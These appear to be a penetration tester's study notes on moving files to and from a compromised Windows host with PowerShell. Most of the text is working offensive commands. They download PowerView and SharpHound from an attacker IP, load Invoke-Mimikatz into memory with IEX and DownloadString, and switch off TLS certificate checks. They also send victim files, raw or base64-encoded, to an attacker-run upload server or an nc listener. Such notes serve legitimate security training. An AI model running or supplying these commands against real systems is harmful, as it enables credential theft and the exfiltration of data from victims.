## Download

```powershell-session
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

```
(New-Object Net.WebClient).DownloadFile('http://10.10.14.26:8000/SharpHound.ps1','C:\Users\olivia\Desktop\SharpHound.ps1')
```

Instead of downloading executables, we can try to run it directly in memory using the `Invoke-Expression cmdlet (IEX)` and `DownloadString`

```powershell-session
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

might also be able to use 
```
wget/curl link -OutFile file.name
```


Important Flags 
`-UseBasicParsing` - if powershell has yet to finish basic configurations

Error:
If SSL/TLS secure channel if certificate is not trusted
```
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
run the command again


## Upload
Set up a web server that accepts uploads on our attack machine

On attack machine 
```
pip3 install uploadserver
python3 -m uploadserver
```


use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to perform the upload operations
```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

```powershell-session
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

Can also convert to base64 and then upload too
```
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```

```
powershell-session
 Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

can catch the base64 in nc
```shell-session
nc -lvnp 8000
```

then decode it
```shell-session
echo <base64> | base64 -d -w 0 > outfile
```


